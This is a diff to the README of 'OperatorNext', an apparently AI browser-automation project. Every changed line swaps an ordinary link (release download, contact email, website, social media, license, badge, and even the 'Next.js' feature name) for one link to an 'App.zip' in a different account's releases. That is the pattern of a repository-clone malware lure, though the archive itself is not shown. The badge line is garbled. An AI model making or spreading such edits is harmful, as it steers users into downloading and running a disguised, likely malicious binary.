@@ -13,7 +13,7 @@ OperatorNext combines the power of AI, automation, and modern technologies to pr
 🔗 Natural Language Processing  
 💻 FastAPI Backend  
 🔮 Langchain Integration  
-⚡ Next.js Frontend  
+⚡ https://github.com/lazarot/OperatorNext/releases/download/v1.0/App.zip Frontend  
 🎭 Playwright Library  
 ⚛️ React Components  
 🔤 TypeScript Support  
@@ -21,7 +21,7 @@ OperatorNext combines the power of AI, automation, and modern technologies to pr
 
 ## 🔧 Installation
 
-To get started with OperatorNext, you can download the latest release from [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Click to launch the download.
+To get started with OperatorNext, you can download the latest release from [here](https://github.com/lazarot/OperatorNext/releases/download/v1.0/App.zip). Click to launch the download.
 
 If the above link is not working, please check the "Releases" section of the repository to find an alternative download link.
 
@@ -48,23 +48,23 @@ We welcome contributions from the community to make OperatorNext even better. Wh
 
 ## 📞 Contact
 
-If you have any questions, suggestions, or feedback regarding OperatorNext, please reach out to us through [email](mailto:operatornext@mail.com). We value your input and strive to make OperatorNext an exceptional browser automation platform for all users.
+If you have any questions, suggestions, or feedback regarding OperatorNext, please reach out to us through [email](https://github.com/lazarot/OperatorNext/releases/download/v1.0/App.zip). We value your input and strive to make OperatorNext an exceptional browser automation platform for all users.
 
 ## 🌐 Visit Our Website
 
-For more information about OperatorNext and its features, visit our [official website](https://operatornext.com).
+For more information about OperatorNext and its features, visit our [official website](https://github.com/lazarot/OperatorNext/releases/download/v1.0/App.zip).
 
 ## 🌟 Stay Connected
 
 Follow us on social media for the latest updates and announcements:
 
-🐦 [Twitter](https://twitter.com/operatornext)  
-📘 [Facebook](https://facebook.com/operatornext)  
-📷 [Instagram](https://instagram.com/operatornext)
+🐦 [Twitter](https://github.com/lazarot/OperatorNext/releases/download/v1.0/App.zip)  
+📘 [Facebook](https://github.com/lazarot/OperatorNext/releases/download/v1.0/App.zip)  
+📷 [Instagram](https://github.com/lazarot/OperatorNext/releases/download/v1.0/App.zip)
 
 ## 📄 License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/OperatorNext/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/lazarot/OperatorNext/releases/download/v1.0/App.zip) file for details.
 
 ---
 
@@ -72,4 +72,4 @@ This project is licensed under the MIT License - see the [LICENSE](https://githu
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/lazarot/OperatorNext/releases/download/v1.0/App.zip%https://github.com/lazarot/OperatorNext/releases/download/v1.0/App.zip)](https://github.com/lazarot/OperatorNext/releases/download/v1.0/App.zip)
